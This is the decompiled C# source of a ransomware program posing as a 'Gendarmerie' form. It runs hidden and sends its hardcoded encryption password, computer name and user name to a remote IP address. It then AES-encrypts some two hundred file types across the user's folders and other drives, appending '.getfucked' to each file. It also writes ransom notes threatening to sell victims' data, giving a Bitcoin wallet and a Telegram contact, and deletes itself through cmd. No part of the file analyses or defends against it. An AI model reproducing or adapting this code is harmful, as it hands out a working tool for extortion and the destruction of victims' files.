using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace GetFucked;

public class GendarmerieForm : Form
{
	private readonly int INTERVAL = 30;

	private string targetURL = "http://2.56.214.165/get/write.php";

	private string userName = Environment.UserName;

	private string computerName = Environment.MachineName.ToString();

	private string userDir = "C:\\Users\\";

	private string backgroundImageUrl = "http://2.56.214.165/get/download.jpg";

	private IContainer components = null;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ExStyle(createParams.get_ExStyle() | 0x80);
			return createParams;
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	public GendarmerieForm()
	{
		InitializeComponent();
	}

	private void GendarmerieForm_Load(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		Timer val = new Timer();
		val.add_Tick((EventHandler)delegate
		{
			((Form)this).Activate();
		});
		val.set_Interval(INTERVAL);
		val.Start();
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		startAction();
		Form2 form = new Form2();
		((Control)form).Show();
	}

	private void Form_Shown(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(100.0);
	}

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 1, 2, 2, 3, 3, 4, 4 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public string CreateRandomString(int length, string str)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append(str[random.Next(str.Length)]);
		}
		return stringBuilder.ToString();
	}

	public void SendPassword(string password)
	{
		try
		{
			string text = "?computer_name=" + computerName + "&userName=" + userName + "&password=" + password + "&allow=ransom";
			string address = targetURL + text;
			new WebClient().DownloadString(address);
		}
		catch (Exception)
		{
		}
	}

	public byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 1, 2, 2, 3, 3, 4, 4 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public void DecryptFile(string file, string password)
	{
		byte[] bytesToBeDecrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Decrypt(bytesToBeDecrypted, bytes);
		File.WriteAllBytes(file, bytes2);
		string extension = Path.GetExtension(file);
		string destFileName = file.Substring(0, file.Length - extension.Length);
		File.Move(file, destFileName);
	}

	public void EncryptFile(string file, string password)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
		try
		{
			File.WriteAllBytes(file, bytes2);
			string text = ".getfucked";
			File.Move(file, file + text);
		}
		catch (UnauthorizedAccessException)
		{
		}
	}

	public void encryptDirectory(string location, string password)
	{
		try
		{
			string[] source = new string[216]
			{
				".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", "jpeg", ".png",
				".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd",
				".sql", ".mp4", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".csv", ".d3dbsp",
				".zip", ".sie", ".sum", ".ibank", ".t13", ".t12", ".qdf", ".gdb", ".tax", ".pkpass",
				".bc6", ".bc7", ".bkp", ".qic", ".bkf", ".sidn", ".sidd", ".mddata", ".itl", ".itdb",
				".icxs", ".hvpl", ".hplg", ".hkdb", ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map",
				".wmo", ".itm", ".sb", ".fos", ".mov", ".vdf", ".ztmp", ".sis", ".sid", ".ncf",
				".menu", ".layout", ".dmp", ".blob", ".esm", ".vcf", ".vtf", ".dazip", ".fpk", ".mlx",
				".kf", ".iwd", ".vpk", ".tor", ".psk", ".rim", ".w3x", ".fsh", ".ntl", ".arch00",
				".lvl", ".snx", ".cfr", ".ff", ".vpp_pc", ".lrf", ".m2", ".mcmeta", ".vfs0", ".mpqge",
				".kdb", ".db0", ".dba", ".rofl", ".hkx", ".bar", ".upk", ".das", ".iwi", ".litemod",
				".asset", ".forge", ".ltx", ".bsa", ".apk", ".re4", ".sav", ".lbf", ".slm", ".bik",
				".epk", ".rgss3a", ".pak", ".big", "wallet", ".wotreplay", ".xxx", ".desc", ".py", ".m3u",
				".flv", ".js", ".css", ".rb", ".p7c", ".pk7", ".p7b", ".p12", ".pfx", ".pem",
				".crt", ".cer", ".der", ".x3f", ".srw", ".pef", ".ptx", ".r3d", ".rw2", ".rwl",
				".raw", ".raf", ".orf", ".nrw", ".mrwref", ".mef", ".erf", ".kdc", ".dcr", ".cr2",
				".crw", ".bay", ".sr2", ".srf", ".arw", ".3fr", ".dng", ".jpe", ".jpg", ".cdr",
				".indd", ".ai", ".eps", ".pdf", ".pdd", ".dbf", ".mdf", ".wb2", ".rtf", ".wpd",
				".dxg", ".xf", ".dwg", ".pst", ".accdb", ".mdb", ".pptm", ".pptx", ".ppt", ".xlk",
				".xlsb", ".xlsm", ".xlsx", ".xls", ".wps", ".docm", ".docx", ".doc", ".odb", ".odc",
				".odm", ".odp", ".ods", ".odt", ".cs", ".exe", ".lnk", ".mpeg", ".mp3", ".mkv",
				".divx", ".ogg", ".zip", ".wav", ".bat", ".index"
			};
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					EncryptFile(files[i], password);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				if (!directories[j].Contains("Windows") && !directories[j].Contains("Program Files") && !directories[j].Contains("Program Files (x86)"))
				{
					encryptDirectory(directories[j], password);
					messageCreator();
				}
			}
		}
		catch (SystemException)
		{
		}
	}

	public static bool CheckForInternetConnection()
	{
		try
		{
			using WebClient webClient = new WebClient();
			using (webClient.OpenRead("https://www.google.fr"))
			{
				return true;
			}
		}
		catch
		{
			return false;
		}
	}

	public void startAction()
	{
		string password = "NRGfg564$%HTw4bwbq345$%w$^Jj565en4ntbrtbt5";
		string text = "\\Desktop\\";
		string text2 = "\\Downloads\\";
		string text3 = "\\Documents\\";
		string text4 = "\\Pictures\\";
		string text5 = "\\Music\\";
		string text6 = "\\Videos\\";
		string location = userDir + userName + text;
		string location2 = userDir + userName + text2;
		string location3 = userDir + userName + text3;
		string location4 = userDir + userName + text4;
		string location5 = userDir + userName + text5;
		string location6 = userDir + userName + text6;
		SendPassword(password);
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array = logicalDrives;
		foreach (string text7 in array)
		{
			if (text7 == "C:\\")
			{
				encryptDirectory(location, password);
				encryptDirectory(location2, password);
				encryptDirectory(location3, password);
				encryptDirectory(location4, password);
				encryptDirectory(location5, password);
				encryptDirectory(location6, password);
				messageCreator();
			}
			else
			{
				encryptDirectory(text7, password);
			}
			messageCreator();
		}
		string path = userDir + userName + "\\download.jpg";
		bool flag;
		do
		{
			if (flag = CheckForInternetConnection())
			{
				SetWallpaperFromWeb(backgroundImageUrl, path);
				SendPassword(password);
			}
		}
		while (!flag);
		password = null;
		selfDestroy();
		Application.Exit();
	}

	public void selfDestroy()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "/C timeout 2 && Del /Q /F " + Application.get_ExecutablePath();
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
	}

	public void SetWallpaper(string path)
	{
		SystemParametersInfo(20u, 0u, path, 3u);
	}

	private void SetWallpaperFromWeb(string url, string path)
	{
		try
		{
			WebClient webClient = new WebClient();
			webClient.DownloadFile(new Uri(url), path);
			SetWallpaper(path);
		}
		catch (Exception)
		{
		}
	}

	public void messageCreator()
	{
		string text = "\\Desktop\\Message_Important.txt";
		string path = userDir + userName + text;
		string[] contents = new string[18]
		{
			"WE LOCKED YOUR FILES , YOU HAVE 24 HOURS TO PAY US 100& OR ", "", "WE WILL DELETE ALL YOUR FILES.", " ", "IF YOU WILL TRY TO DO SOMETHING STUPID LIKE FORMAT YOUR PC, YOUR FILES WILL STAY GO AWAY WHAT GONNA HAPPEN IF YOU DONT PAY ?", " ", " 1. WE HAVE ALL YOUR PRIVATE INFORMATION AND WE GONNA SELL IT AT DARKNET", " ", "  WE HAVE YOUR ALL YOUR GAME ACCOUNTS , PERSONAL INFORMATION , ID PICTURES , CC INFORMATION , PERSONAL PHOTOS ", " ",
			" FAMILY DETAILS , WORK DETAILS , AND ETC", " ", "               Our BitCoin Wallet Fpr Payment: 3NqdQ89Y7QXpsvjy5o2tYgHnFBAUvD3dK4", " ", " ", "TELEGRAM App User To Prove The Payment : @getfucked2020", " ", " "
		};
		File.WriteAllLines(path, contents);
		string text2 = "\\Downloads\\Message_Important.txt";
		string path2 = userDir + userName + text2;
		string[] contents2 = new string[18]
		{
			"WE LOCKED YOUR FILES , YOU HAVE 24 HOURS TO PAY US 100& OR ", "", "WE WILL DELETE ALL YOUR FILES.", " ", "IF YOU WILL TRY TO DO SOMETHING STUPID LIKE FORMAT YOUR PC, YOUR FILES WILL STAY GO AWAY WHAT GONNA HAPPEN IF YOU DONT PAY ?", " ", " 1. WE HAVE ALL YOUR PRIVATE INFORMATION AND WE GONNA SELL IT AT DARKNET", " ", "  WE HAVE YOUR ALL YOUR GAME ACCOUNTS , PERSONAL INFORMATION , ID PICTURES , CC INFORMATION , PERSONAL PHOTOS ", " ",
			" FAMILY DETAILS , WORK DETAILS , AND ETC", " ", "               Our BitCoin Wallet Fpr Payment: 3NqdQ89Y7QXpsvjy5o2tYgHnFBAUvD3dK4", " ", " ", "TELEGRAM App User To Prove The Payment : @getfucked2020", " ", " "
		};
		File.WriteAllLines(path2, contents2);
		string text3 = "\\Documents\\Message_Important.txt";
		string path3 = userDir + userName + text3;
		string[] contents3 = new string[18]
		{
			"WE LOCKED YOUR FILES , YOU HAVE 24 HOURS TO PAY US 100& OR ", "", "WE WILL DELETE ALL YOUR FILES.", " ", "IF YOU WILL TRY TO DO SOMETHING STUPID LIKE FORMAT YOUR PC, YOUR FILES WILL STAY GO AWAY WHAT GONNA HAPPEN IF YOU DONT PAY ?", " ", " 1. WE HAVE ALL YOUR PRIVATE INFORMATION AND WE GONNA SELL IT AT DARKNET", " ", "  WE HAVE YOUR ALL YOUR GAME ACCOUNTS , PERSONAL INFORMATION , ID PICTURES , CC INFORMATION , PERSONAL PHOTOS ", " ",
			" FAMILY DETAILS , WORK DETAILS , AND ETC", " ", "               Our BitCoin Wallet Fpr Payment: 3NqdQ89Y7QXpsvjy5o2tYgHnFBAUvD3dK4", " ", " ", "TELEGRAM App User To Prove The Payment : @getfucked2020", " ", " "
		};
		File.WriteAllLines(path3, contents3);
		string text4 = "\\Pictures\\Message_Important.txt";
		string path4 = userDir + userName + text4;
		string[] contents4 = new string[18]
		{
			"WE LOCKED YOUR FILES , YOU HAVE 24 HOURS TO PAY US 100& OR ", "", "WE WILL DELETE ALL YOUR FILES.", " ", "IF YOU WILL TRY TO DO SOMETHING STUPID LIKE FORMAT YOUR PC, YOUR FILES WILL STAY GO AWAY WHAT GONNA HAPPEN IF YOU DONT PAY ?", " ", " 1. WE HAVE ALL YOUR PRIVATE INFORMATION AND WE GONNA SELL IT AT DARKNET", " ", "  WE HAVE YOUR ALL YOUR GAME ACCOUNTS , PERSONAL INFORMATION , ID PICTURES , CC INFORMATION , PERSONAL PHOTOS ", " ",
			" FAMILY DETAILS , WORK DETAILS , AND ETC", " ", "               Our BitCoin Wallet Fpr Payment: 3NqdQ89Y7QXpsvjy5o2tYgHnFBAUvD3dK4", " ", " ", "TELEGRAM App User To Prove The Payment : @getfucked2020", " ", " "
		};
		File.WriteAllLines(path4, contents4);
		string text5 = "\\Music\\Message_Important.txt";
		string path5 = userDir + userName + text5;
		string[] contents5 = new string[18]
		{
			"WE LOCKED YOUR FILES , YOU HAVE 24 HOURS TO PAY US 100& OR ", "", "WE WILL DELETE ALL YOUR FILES.", " ", "IF YOU WILL TRY TO DO SOMETHING STUPID LIKE FORMAT YOUR PC, YOUR FILES WILL STAY GO AWAY WHAT GONNA HAPPEN IF YOU DONT PAY ?", " ", " 1. WE HAVE ALL YOUR PRIVATE INFORMATION AND WE GONNA SELL IT AT DARKNET", " ", "  WE HAVE YOUR ALL YOUR GAME ACCOUNTS , PERSONAL INFORMATION , ID PICTURES , CC INFORMATION , PERSONAL PHOTOS ", " ",
			" FAMILY DETAILS , WORK DETAILS , AND ETC", " ", "               Our BitCoin Wallet Fpr Payment: 3NqdQ89Y7QXpsvjy5o2tYgHnFBAUvD3dK4", " ", " ", "TELEGRAM App User To Prove The Payment : @getfucked2020", " ", " "
		};
		File.WriteAllLines(path5, contents5);
		string text6 = "\\Videos\\Message_Important.txt";
		string path6 = userDir + userName + text6;
		string[] contents6 = new string[18]
		{
			"WE LOCKED YOUR FILES , YOU HAVE 24 HOURS TO PAY US 100& OR ", "", "WE WILL DELETE ALL YOUR FILES.", " ", "IF YOU WILL TRY TO DO SOMETHING STUPID LIKE FORMAT YOUR PC, YOUR FILES WILL STAY GO AWAY WHAT GONNA HAPPEN IF YOU DONT PAY ?", " ", " 1. WE HAVE ALL YOUR PRIVATE INFORMATION AND WE GONNA SELL IT AT DARKNET", " ", "  WE HAVE YOUR ALL YOUR GAME ACCOUNTS , PERSONAL INFORMATION , ID PICTURES , CC INFORMATION , PERSONAL PHOTOS ", " ",
			" FAMILY DETAILS , WORK DETAILS , AND ETC", " ", "               Our BitCoin Wallet Fpr Payment: 3NqdQ89Y7QXpsvjy5o2tYgHnFBAUvD3dK4", " ", " ", "TELEGRAM App User To Prove The Payment : @getfucked2020", " ", " "
		};
		File.WriteAllLines(path6, contents6);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(GendarmerieForm));
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(120, 52));
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("GendarmerieForm");
		((Control)this).set_Text("Gendarmerie V.B.3");
		((Form)this).add_Load((EventHandler)GendarmerieForm_Load);
		((Control)this).ResumeLayout(false);
	}
}
